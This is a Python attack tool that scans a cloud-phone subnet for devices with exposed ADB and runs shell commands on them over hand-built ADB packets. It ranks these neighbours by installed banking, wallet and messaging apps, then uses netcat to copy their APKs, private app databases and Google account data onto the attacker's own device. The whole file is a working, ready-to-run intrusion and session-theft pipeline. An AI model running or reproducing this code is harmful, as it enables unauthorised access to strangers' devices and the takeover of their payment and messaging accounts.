#!/usr/bin/env python3
"""
Full Neighbor Clone Pipeline v2.0
=================================
Scans neighbors on current subnet → probes for apps → selects best →
clones entire app data + APKs + system data → restores onto our device.

Architecture:
  Phase 1: Port scan 10.12.11.x/24 for ADB port 5555
  Phase 2: Probe each neighbor for identity + apps via ADB relay
  Phase 3: Select best neighbor (most high-value apps)
  Phase 4: Pull APKs from neighbor → install on our device
  Phase 5: Pull app data (shared_prefs, databases) → inject into our device

Usage:
  python3 tools/full_neighbor_clone.py
"""

import asyncio
import base64
import json
import os
import re
import struct
import sys
import time
from pathlib import Path
from datetime import datetime

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ══════════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════════

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
PAD = "APP6476KYH9KMLU5"
BASE_URL = "https://api.vmoscloud.com"
VPS_IP = "YOUR_OLLAMA_HOST"
CMD_DELAY = 3.5

# Our device IP (discovered dynamically)
OUR_IP = None

# High-value packages we want to clone
TARGET_APPS = {
    "com.google.android.apps.walletnfcrel",  # Google Wallet
    "com.whatsapp",                           # WhatsApp
    "com.whatsapp.w4b",                       # WhatsApp Business
    "org.telegram.messenger",                 # Telegram
    "com.revolut.revolut",                    # Revolut
    "com.paypal.android.p2pmobile",           # PayPal
    "com.instagram.android",                  # Instagram
    "com.samsung.android.spay",               # Samsung Pay
    "com.venmo",                              # Venmo
    "com.squareup.cash",                      # Cash App
}

# ══════════════════════════════════════════════════════════════════════
# ADB WIRE PROTOCOL
# ══════════════════════════════════════════════════════════════════════

def _cs(d): return sum(d) & 0xFFFFFFFF
def _mg(c): return struct.unpack("<I", c)[0] ^ 0xFFFFFFFF
def _pkt(c, a0, a1, d=b""):
    return struct.pack("<4sIIIII", c, a0, a1, len(d), _cs(d), _mg(c)) + d
def cnxn(): return _pkt(b"CNXN", 0x01000001, 256*1024, b"host::\x00")
def opn(lid, svc): return _pkt(b"OPEN", lid, 0, svc.encode() + b"\x00")


# ══════════════════════════════════════════════════════════════════════
# CLOUD BRIDGE
# ══════════════════════════════════════════════════════════════════════

class Bridge:
    def __init__(self):
        self.client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE_URL)
        self._last = 0.0
        self._cnxn = {}

    async def _throttle(self):
        elapsed = time.time() - self._last
        if elapsed < CMD_DELAY:
            await asyncio.sleep(CMD_DELAY - elapsed)

    async def cmd(self, sh, t=30):
        await self._throttle()
        self._last = time.time()
        try:
            r = await self.client.sync_cmd(PAD, sh, timeout_sec=t)
            d = r.get("data", [])
            if isinstance(d, list) and d:
                return (d[0].get("errorMsg", "") or "").strip()
            return ""
        except Exception as e:
            return f"ERR:{e}"

    async def fire(self, sh):
        await self._throttle()
        self._last = time.time()
        try:
            await self.client.async_adb_cmd([PAD], sh)
        except:
            pass

    async def _stage_cnxn(self, ip):
        key = ip.replace(".", "_")
        if key not in self._cnxn:
            b64 = base64.b64encode(cnxn()).decode()
            await self.cmd(f"echo -n '{b64}' | base64 -d > /sdcard/.cnxn_{key}")
            self._cnxn[key] = True

    async def nb_cmd(self, ip, shell_cmd, timeout=10):
        """Execute shell on neighbor via ADB relay, return output."""
        ip_key = ip.replace(".", "_")
        tag = f"{hash(shell_cmd) & 0xFFFF:04x}"

        await self._stage_cnxn(ip)

        pkt = opn(1, f"shell:{shell_cmd}")
        b64 = base64.b64encode(pkt).decode()
        await self.cmd(f"echo -n '{b64}' | base64 -d > /sdcard/.o{tag}")

        relay = (
            f"(cat /sdcard/.cnxn_{ip_key}; sleep 0.3; cat /sdcard/.o{tag}; "
            f"sleep {timeout}) | timeout {timeout + 2} nc {ip} 5555 "
            f"> /sdcard/.r{tag} 2>/dev/null"
        )
        await self.fire(relay)
        await asyncio.sleep(timeout + 4)

        # Parse with chunked read to avoid 2KB truncation
        await self.cmd(
            f"strings -n 2 /sdcard/.r{tag} 2>/dev/null | "
            f"grep -v -E '^(CNXN|OKAY|WRTE|CLSE|OPEN|host::|device::)' "
            f"> /sdcard/.t{tag}"
        )

        total = await self.cmd(f"wc -l < /sdcard/.t{tag} 2>/dev/null || echo 0")
        try:
            n = int(total.strip())
        except:
            n = 0

        if n == 0:
            await self.cmd(f"rm -f /sdcard/.o{tag} /sdcard/.r{tag} /sdcard/.t{tag}")
            return ""

        chunks = []
        CHUNK = 40
        for start in range(0, n, CHUNK):
            if start == 0:
                chunk = await self.cmd(f"head -{CHUNK} /sdcard/.t{tag}")
            else:
                chunk = await self.cmd(f"tail -n +{start+1} /sdcard/.t{tag} | head -{CHUNK}")
            if chunk:
                chunks.append(chunk)

        await self.cmd(f"rm -f /sdcard/.o{tag} /sdcard/.r{tag} /sdcard/.t{tag}")
        return "\n".join(chunks).strip()

    async def nb_pull(self, ip, remote_path, device_dest, timeout=90):
        """Pull file from neighbor → our device via nc relay. Returns bytes."""
        global OUR_IP
        port = 19870 + (hash(remote_path) & 0xFF)

        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f {device_dest}")
        await self._stage_cnxn(ip)

        shell_cmd = f"cat {remote_path} | nc -w 10 {OUR_IP} {port}"
        pkt = opn(1, f"shell:{shell_cmd}")
        b64 = base64.b64encode(pkt).decode()
        await self.cmd(f"echo -n '{b64}' | base64 -d > /sdcard/.xfer_open")

        # Start listener
        await self.fire(f"nc -l -p {port} > {device_dest}")
        await asyncio.sleep(2)

        # Fire relay
        ip_key = ip.replace(".", "_")
        relay = (
            f"(cat /sdcard/.cnxn_{ip_key}; sleep 0.3; cat /sdcard/.xfer_open; "
            f"sleep {timeout}) | timeout {timeout + 5} nc {ip} 5555 > /dev/null 2>&1"
        )
        await self.fire(relay)

        # Wait (NO sync_cmd during transfer!)
        print(f"    Transfer waiting {timeout}s...")
        for wait in range(0, timeout, 15):
            await asyncio.sleep(15)
            sz = await self.cmd(f"stat -c %s {device_dest} 2>/dev/null || echo 0")
            sz_n = int(sz.strip()) if sz.strip().isdigit() else 0
            if sz_n > 0:
                print(f"    [{wait+15}s] {sz_n/1048576:.1f}MB received")

        await asyncio.sleep(5)
        sz = await self.cmd(f"wc -c < {device_dest} 2>/dev/null || echo 0")
        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /sdcard/.xfer_open")
        return int(sz.strip()) if sz.strip().isdigit() else 0


# ══════════════════════════════════════════════════════════════════════
# PHASE 1: DISCOVER NEIGHBORS
# ══════════════════════════════════════════════════════════════════════

async def discover_neighbors(b: Bridge) -> list:
    """Scan subnet for ADB-open neighbors."""
    global OUR_IP
    print("\n" + "="*60)
    print("  PHASE 1: NEIGHBOR DISCOVERY")
    print("="*60)

    # Get our IP
    out = await b.cmd("ip addr show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
    OUR_IP = out.strip()
    subnet = ".".join(OUR_IP.split(".")[:3])
    print(f"  Our IP: {OUR_IP}")
    print(f"  Scanning {subnet}.1-254 for ADB port 5555...")

    # Write scan script to device via HTTP from VPS
    scan_sh = f"""#!/system/bin/sh
rm -f /data/local/tmp/adb_hosts.txt
for i in $(seq 1 254); do
    IP="{subnet}.$i"
    [ "$IP" = "{OUR_IP}" ] && continue
    (echo Q | timeout 2 nc -w 1 $IP 5555 >/dev/null 2>&1 && echo $IP >> /data/local/tmp/adb_hosts.txt) &
    [ $((i % 40)) -eq 0 ] && wait
done
wait
echo SCAN_DONE >> /data/local/tmp/adb_hosts.txt
"""
    # Write script via base64
    b64_script = base64.b64encode(scan_sh.encode()).decode()
    await b.cmd(f"echo '{b64_script}' | base64 -d > /data/local/tmp/scan_adb.sh && chmod 755 /data/local/tmp/scan_adb.sh")

    # Launch as background
    await b.fire("nohup sh /data/local/tmp/scan_adb.sh > /dev/null 2>&1 &")

    # Poll for completion
    for i in range(40):
        await asyncio.sleep(8)
        log = await b.cmd("cat /data/local/tmp/adb_hosts.txt 2>/dev/null || echo NOLOG")
        if "SCAN_DONE" in (log or ""):
            hosts = [l.strip() for l in log.split("\n")
                     if l.strip() and l.strip() != "SCAN_DONE" and not l.startswith("NOLOG")]
            print(f"  Scan complete: {len(hosts)} ADB-open neighbors")
            return hosts
        hosts_so_far = [l.strip() for l in (log or "").split("\n")
                        if l.strip() and l.strip() != "NOLOG"]
        if i % 3 == 0:
            print(f"  [{i*8}s] Found {len(hosts_so_far)} so far...")

    # Timeout fallback
    log = await b.cmd("cat /data/local/tmp/adb_hosts.txt 2>/dev/null")
    hosts = [l.strip() for l in (log or "").split("\n")
             if l.strip() and l.strip() != "SCAN_DONE" and not l.startswith("NOLOG")]
    print(f"  Scan timeout: {len(hosts)} hosts found")
    return hosts


# ══════════════════════════════════════════════════════════════════════
# PHASE 2: PROBE NEIGHBORS
# ══════════════════════════════════════════════════════════════════════

async def probe_neighbor(b: Bridge, ip: str) -> dict:
    """Probe a neighbor for identity + apps."""
    compound = (
        "echo ===ID===; "
        "getprop ro.product.model; "
        "getprop ro.product.brand; "
        "echo ===SHELL===; "
        "id | head -1; "
        "echo ===APPS===; "
        "pm list packages -3 2>/dev/null; "
        "echo ===ACC===; "
        "dumpsys account 2>/dev/null | grep -c 'Account {' 2>/dev/null; "
        "echo ===END==="
    )

    out = await b.nb_cmd(ip, compound, timeout=12)

    if not out or "===ID===" not in out:
        return {"ip": ip, "status": "unreachable"}

    lines = out.split("\n")
    model = brand = shell = ""
    apps = []
    acct_count = 0
    section = ""

    for line in lines:
        line = line.strip()
        if "===ID===" in line: section = "id"; continue
        if "===SHELL===" in line: section = "shell"; continue
        if "===APPS===" in line: section = "apps"; continue
        if "===ACC===" in line: section = "acc"; continue
        if "===END===" in line: break

        if section == "id":
            if not model: model = line
            elif not brand: brand = line
        elif section == "shell":
            shell = "root" if "uid=0" in line else "shell"
        elif section == "apps":
            if line.startswith("package:"):
                apps.append(line.replace("package:", ""))
        elif section == "acc":
            try: acct_count = int(line)
            except: pass

    hv = [a for a in apps if a in TARGET_APPS]

    return {
        "ip": ip,
        "status": "alive",
        "model": model,
        "brand": brand,
        "shell": shell,
        "apps": apps,
        "app_count": len(apps),
        "hv_apps": hv,
        "hv_count": len(hv),
        "acct_count": acct_count,
    }


async def probe_all(b: Bridge, hosts: list) -> list:
    """Probe all neighbors and rank by value."""
    print(f"\n{'='*60}")
    print(f"  PHASE 2: PROBING {len(hosts)} NEIGHBORS")
    print("="*60)

    results = []
    for i, ip in enumerate(hosts[:30]):  # Cap at 30
        info = await probe_neighbor(b, ip)
        if info["status"] != "alive":
            print(f"  [{i+1}/{min(30, len(hosts))}] {ip}: unreachable")
            continue

        wallet = "WALLET" if "com.google.android.apps.walletnfcrel" in info["apps"] else ""
        wa = "WA" if any(a in info["apps"] for a in ["com.whatsapp", "com.whatsapp.w4b"]) else ""
        tg = "TG" if "org.telegram.messenger" in info["apps"] else ""
        rev = "REV" if "com.revolut.revolut" in info["apps"] else ""
        tags = " ".join(filter(None, [wallet, wa, tg, rev]))

        print(f"  [{i+1}/{min(30, len(hosts))}] {ip}: {info['brand']} {info['model']} | "
              f"{info['app_count']} apps | HV={info['hv_count']} [{tags}] | "
              f"Accts={info['acct_count']} | {info['shell']}")
        results.append(info)

    results.sort(key=lambda x: (x["hv_count"], x["app_count"]), reverse=True)
    return results


# ══════════════════════════════════════════════════════════════════════
# PHASE 3: CLONE SELECTED NEIGHBOR
# ══════════════════════════════════════════════════════════════════════

async def clone_neighbor(b: Bridge, target: dict):
    """Full clone: pull APKs + app data from neighbor, install on our device."""
    ip = target["ip"]
    print(f"\n{'='*60}")
    print(f"  PHASE 3: CLONING {ip} ({target['brand']} {target['model']})")
    print(f"  High-value apps: {target['hv_apps']}")
    print("="*60)

    # ─── Step 1: Get APK paths for ALL apps we want ───
    print("\n  [1/4] Getting APK paths from neighbor...")

    all_apps_to_clone = target["apps"]  # Clone everything
    apk_paths = {}

    # Query in batches of 5
    for i in range(0, len(all_apps_to_clone), 5):
        batch = all_apps_to_clone[i:i+5]
        cmd_parts = "; ".join([f"echo PKG:{pkg}:$(pm path {pkg} 2>/dev/null | head -1)" for pkg in batch])
        out = await b.nb_cmd(ip, cmd_parts, timeout=10)

        for line in (out or "").split("\n"):
            if line.startswith("PKG:"):
                parts = line.split(":", 2)
                if len(parts) >= 3 and "package:" in parts[2]:
                    pkg = parts[1]
                    path = parts[2].replace("package:", "").strip()
                    if path and path.endswith(".apk"):
                        apk_paths[pkg] = path

    print(f"  Found APK paths for {len(apk_paths)} packages")

    # ─── Step 2: Pull and install APKs ───
    print(f"\n  [2/4] Pulling and installing APKs...")
    await b.cmd("mkdir -p /data/local/tmp/clone_apks")

    installed = []
    failed = []

    # Prioritize high-value apps
    priority_pkgs = target["hv_apps"] + [a for a in all_apps_to_clone if a not in target["hv_apps"]]

    for pkg in priority_pkgs:
        if pkg not in apk_paths:
            continue

        apk_path = apk_paths[pkg]
        local_dest = f"/data/local/tmp/clone_apks/{pkg}.apk"

        # Check if already installed on our device
        check = await b.cmd(f"pm list packages 2>/dev/null | grep -c {pkg}")
        if check.strip() == "1":
            print(f"    {pkg}: already installed, skipping APK pull")
            installed.append(pkg)
            continue

        # Get APK size from neighbor
        size_out = await b.nb_cmd(ip, f"wc -c < {apk_path} 2>/dev/null || echo 0", timeout=8)
        try:
            apk_size = int(size_out.strip())
        except:
            apk_size = 0

        if apk_size == 0:
            print(f"    {pkg}: can't read APK on neighbor, skip")
            failed.append(pkg)
            continue

        apk_mb = apk_size / 1048576
        if apk_mb > 150:
            print(f"    {pkg}: APK too large ({apk_mb:.0f}MB), skip")
            failed.append(pkg)
            continue

        print(f"    Pulling {pkg} ({apk_mb:.1f}MB)...")
        pulled = await b.nb_pull(ip, apk_path, local_dest, timeout=max(60, int(apk_mb * 3)))

        if pulled < apk_size * 0.9:
            print(f"    {pkg}: pull incomplete ({pulled}/{apk_size}), skip")
            failed.append(pkg)
            continue

        # Install
        print(f"    Installing {pkg}...")
        await b.cmd(f"chmod 644 {local_dest}")
        result = await b.cmd(f"pm install -r -d -g {local_dest} 2>&1", t=60)

        if "Success" in (result or ""):
            print(f"    {pkg}: INSTALLED")
            installed.append(pkg)
        else:
            # Try with --bypass-low-target-sdk-block
            result2 = await b.cmd(f"pm install -r -d -g --bypass-low-target-sdk-block {local_dest} 2>&1", t=60)
            if "Success" in (result2 or ""):
                print(f"    {pkg}: INSTALLED (bypass flag)")
                installed.append(pkg)
            else:
                print(f"    {pkg}: install FAILED - {(result or result2 or '')[:100]}")
                failed.append(pkg)

        # Cleanup APK to save space
        await b.cmd(f"rm -f {local_dest}")

    print(f"\n  Installed: {len(installed)} | Failed: {len(failed)}")

    # ─── Step 3: Pull app data (shared_prefs, databases) ───
    print(f"\n  [3/4] Pulling app data from neighbor...")

    # Only clone data for apps that are now installed on our device
    data_apps = [pkg for pkg in installed if pkg in TARGET_APPS or pkg in target["hv_apps"]]
    if not data_apps:
        data_apps = installed[:10]  # Top 10 if no specific targets

    for pkg in data_apps:
        print(f"\n    === {pkg} data ===")

        # Check what data exists on neighbor
        data_check = await b.nb_cmd(ip,
            f"ls -la /data/data/{pkg}/shared_prefs/ 2>/dev/null | head -5; "
            f"echo ---; "
            f"ls -la /data/data/{pkg}/databases/ 2>/dev/null | head -5; "
            f"echo ---; "
            f"ls -la /data/data/{pkg}/files/ 2>/dev/null | head -3",
            timeout=10
        )
        print(f"    Data dirs: {(data_check or 'none')[:200]}")

        if not data_check or data_check == "none":
            continue

        # Create tar of app data on neighbor
        tar_path = f"/data/local/tmp/.clone_{pkg.replace('.', '_')}.tar.gz"
        tar_cmd = (
            f"tar czf {tar_path} "
            f"/data/data/{pkg}/shared_prefs "
            f"/data/data/{pkg}/databases "
            f"/data/data/{pkg}/files "
            f"/data/data/{pkg}/no_backup "
            f"2>/dev/null; wc -c < {tar_path} 2>/dev/null || echo 0"
        )
        tar_out = await b.nb_cmd(ip, tar_cmd, timeout=20)
        tar_size = 0
        for line in (tar_out or "").split("\n"):
            if line.strip().isdigit():
                tar_size = int(line.strip())

        if tar_size == 0:
            print(f"    No data to tar (permissions?)")
            continue

        tar_mb = tar_size / 1048576
        print(f"    Data tar: {tar_mb:.2f}MB")

        if tar_mb > 50:
            print(f"    Too large, skipping data clone")
            continue

        # Pull tar
        device_tar = f"/data/local/tmp/clone_{pkg.replace('.', '_')}.tar.gz"
        pulled = await b.nb_pull(ip, tar_path, device_tar, timeout=max(60, int(tar_mb * 5)))

        if pulled > 0:
            # Extract on our device
            print(f"    Extracting data...")

            # Stop the app first (flush WAL)
            await b.cmd(f"am force-stop {pkg}")

            # Extract tar (it contains absolute paths, extracting to / will place correctly)
            # But we need to be careful - extract to temp first, then copy with correct UID
            await b.cmd(f"mkdir -p /data/local/tmp/clone_extract")
            await b.cmd(f"tar xzf {device_tar} -C /data/local/tmp/clone_extract 2>/dev/null")

            # Get the UID of the package on our device
            uid_out = await b.cmd(f"stat -c %u /data/data/{pkg}/ 2>/dev/null || echo 0")
            uid = uid_out.strip() if uid_out.strip().isdigit() else "0"

            # Copy shared_prefs
            await b.cmd(
                f"cp -rf /data/local/tmp/clone_extract/data/data/{pkg}/shared_prefs/* "
                f"/data/data/{pkg}/shared_prefs/ 2>/dev/null"
            )
            # Copy databases
            await b.cmd(
                f"cp -rf /data/local/tmp/clone_extract/data/data/{pkg}/databases/* "
                f"/data/data/{pkg}/databases/ 2>/dev/null"
            )
            # Copy files
            await b.cmd(
                f"cp -rf /data/local/tmp/clone_extract/data/data/{pkg}/files/* "
                f"/data/data/{pkg}/files/ 2>/dev/null"
            )

            # Fix ownership and SELinux
            await b.cmd(f"chown -R {uid}:{uid} /data/data/{pkg}/ 2>/dev/null")
            await b.cmd(f"restorecon -R /data/data/{pkg}/ 2>/dev/null")

            print(f"    Data injected for {pkg}")

            # Cleanup
            await b.cmd(f"rm -rf /data/local/tmp/clone_extract /data/local/tmp/clone_{pkg.replace('.', '_')}.tar.gz")
        else:
            print(f"    Pull failed")

        # Cleanup tar on neighbor
        await b.nb_cmd(ip, f"rm -f {tar_path}", timeout=5)

    # ─── Step 4: Clone system data (GMS, GSF, Chrome) ───
    print(f"\n  [4/4] Cloning system data (GMS, GSF)...")

    system_targets = [
        ("/data/data/com.google.android.gms/shared_prefs", "gms_prefs"),
        ("/data/data/com.google.android.gms/databases", "gms_dbs"),
        ("/data/data/com.google.android.gsf/databases", "gsf_dbs"),
        ("/data/data/com.google.android.gsf/shared_prefs", "gsf_prefs"),
    ]

    for remote_dir, label in system_targets:
        tar_path = f"/data/local/tmp/.sys_{label}.tar.gz"
        out = await b.nb_cmd(ip,
            f"tar czf {tar_path} {remote_dir} 2>/dev/null; "
            f"wc -c < {tar_path} 2>/dev/null || echo 0",
            timeout=15
        )
        size = 0
        for line in (out or "").split("\n"):
            if line.strip().isdigit():
                size = int(line.strip())

        if size == 0:
            print(f"    {label}: no data or permission denied")
            continue

        print(f"    {label}: {size/1024:.0f}KB — pulling...")
        device_tar = f"/data/local/tmp/sys_{label}.tar.gz"
        pulled = await b.nb_pull(ip, tar_path, device_tar, timeout=60)

        if pulled > 0:
            # Save to VPS for reference
            vps_dest = f"/tmp/clone_sys_{label}.tar.gz"
            await b.cmd(f"mkdir -p /data/local/tmp/sys_extract")
            await b.cmd(f"tar xzf {device_tar} -C /data/local/tmp/sys_extract 2>/dev/null")

            # Copy relevant files
            pkg_name = remote_dir.split("/data/data/")[1].split("/")[0] if "/data/data/" in remote_dir else ""
            if pkg_name:
                uid_out = await b.cmd(f"stat -c %u /data/data/{pkg_name}/ 2>/dev/null || echo 0")
                uid = uid_out.strip() if uid_out.strip().isdigit() else "0"

                subdir = remote_dir.split("/")[-1]  # shared_prefs or databases
                await b.cmd(
                    f"cp -rf /data/local/tmp/sys_extract{remote_dir}/* "
                    f"/data/data/{pkg_name}/{subdir}/ 2>/dev/null"
                )
                await b.cmd(f"chown -R {uid}:{uid} /data/data/{pkg_name}/{subdir}/ 2>/dev/null")
                await b.cmd(f"restorecon -R /data/data/{pkg_name}/{subdir}/ 2>/dev/null")
                print(f"    {label}: injected")

            await b.cmd(f"rm -rf /data/local/tmp/sys_extract {device_tar}")
        else:
            print(f"    {label}: pull failed")

        await b.nb_cmd(ip, f"rm -f {tar_path}", timeout=5)

    return installed, failed


# ══════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════

async def main():
    b = Bridge()

    # Phase 1: Discover
    hosts = await discover_neighbors(b)
    if not hosts:
        print("\nNo ADB-open neighbors found. Aborting.")
        return

    # Phase 2: Probe
    ranked = await probe_all(b, hosts)
    if not ranked:
        print("\nNo responsive neighbors. Aborting.")
        return

    # Save scan results
    scan_file = Path("/tmp/neighbor_scan_results.json")
    with open(scan_file, "w") as f:
        json.dump([{k: v for k, v in r.items() if k != "apps"} for r in ranked], f, indent=2)

    # Show top results
    print(f"\n{'='*60}")
    print("  TOP NEIGHBORS")
    print("="*60)
    for i, r in enumerate(ranked[:5]):
        wallet = "WALLET" if "com.google.android.apps.walletnfcrel" in r.get("apps", []) else ""
        wa = "WA" if any(a in r.get("apps", []) for a in ["com.whatsapp", "com.whatsapp.w4b"]) else ""
        tg = "TG" if "org.telegram.messenger" in r.get("apps", []) else ""
        tags = " ".join(filter(None, [wallet, wa, tg]))
        print(f"  #{i+1} {r['ip']}: {r['brand']} {r['model']} | "
              f"HV={r['hv_count']} [{tags}] | Apps={r['app_count']} | "
              f"Accts={r['acct_count']} | {r['shell']}")

    # Phase 3: Clone the best one
    best = ranked[0]
    print(f"\n  >>> Selecting {best['ip']} ({best['brand']} {best['model']}) for cloning")

    installed, failed = await clone_neighbor(b, best)

    # Final verification
    print(f"\n{'='*60}")
    print("  FINAL VERIFICATION")
    print("="*60)

    out = await b.cmd("pm list packages -3 2>/dev/null")
    our_apps = [l.replace("package:", "").strip() for l in (out or "").split("\n") if l.startswith("package:")]
    print(f"  Total 3rd-party apps: {len(our_apps)}")

    out = await b.cmd("dumpsys account 2>/dev/null | grep -E 'Account \\{|Accounts:' | head -5")
    print(f"  Accounts: {out}")

    # Check for target apps specifically
    for app in TARGET_APPS:
        status = "INSTALLED" if app in our_apps else "missing"
        print(f"    {app}: {status}")

    print(f"\n  Clone complete!")
    print(f"  Source: {best['ip']} ({best['brand']} {best['model']})")
    print(f"  Installed: {len(installed)} | Failed: {len(failed)}")
    if failed:
        print(f"  Failed packages: {failed}")


if __name__ == "__main__":
    asyncio.run(main())
